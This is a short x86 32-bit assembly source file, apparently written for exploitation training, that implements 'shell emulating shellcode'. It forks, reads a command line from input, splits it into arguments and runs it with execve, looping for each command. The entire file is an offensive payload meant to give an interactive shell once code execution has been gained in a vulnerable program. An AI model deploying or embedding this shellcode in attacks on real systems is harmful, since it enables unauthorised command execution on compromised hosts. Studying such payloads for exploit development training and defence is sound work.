	;; Evan Jensen 32bit shell emulating shellcode
	;; 

	%include "short32.s"
	%include "syscall.s"
	%define BUFFERLEN 0x1ff

	global main

main:

do_fork:
	
	SYSTEM_CALL(fork)
	test eax,eax
	jz short child
parent:
	push byte 0
	push byte 0
	push byte 0
	pop ebx
	pop ecx
	pop edx	
	SYSTEM_CALL(waitpid)
	jmp short do_fork
child:
	cld
	
get_input:
	xor eax,eax
	cdq
	mov dx,BUFFERLEN
	sub esp,edx
	mov ecx,esp
	xor ebx,ebx
	SYSTEM_CALL(read)
	mov ebp,eax
	test eax,eax
	jz short do_exit ;synchronous IO or GTFO
	mov byte [eax+esp-1],0


	;; push eax ;return of read pushed by get_input
	;; pop ecx
	
	;let's parse the arguments here
	xchg eax,ecx
	push byte " "		
	pop eax			;space used for inlined strchr
	mov ebx,esp
	cdq			;msb of eax is zero so this is ok
	
	add esp,BUFFERLEN	;space for argv[]
add_token: 	;; calculate the pointerp to push
	
	mov esi,ebp
	sub esi,ecx
 	
	lea edi,[ebx + esi] ;register subtraction no good in lea
	mov [esp+edx*4], edi ;save the current token
	inc edx		     ;increment argv[] index
	
	repne scasb		;find the next space
	
	mov esi,ebp
	sub esi,ecx
	mov byte[ebx+esi-1],0	;replace the space with null byte (strtok)
	
	test ecx,ecx		;if ECX is zero we've hit the end of the input str
	jz short exec		;set up for execve systemcall (with argv =D)
	jmp short add_token	;if not, strtok
	
exec:
	xchg ecx,eax		;eax=0
	mov [esp+edx*4],eax
	cdq
	mov al,execve
	lea ecx,[esp]
	SYSTEM_CALL
	
do_exit:;; exit nicely if anything fails
	xor ebx,ebx ;optional
	SYSTEM_CALL(exit)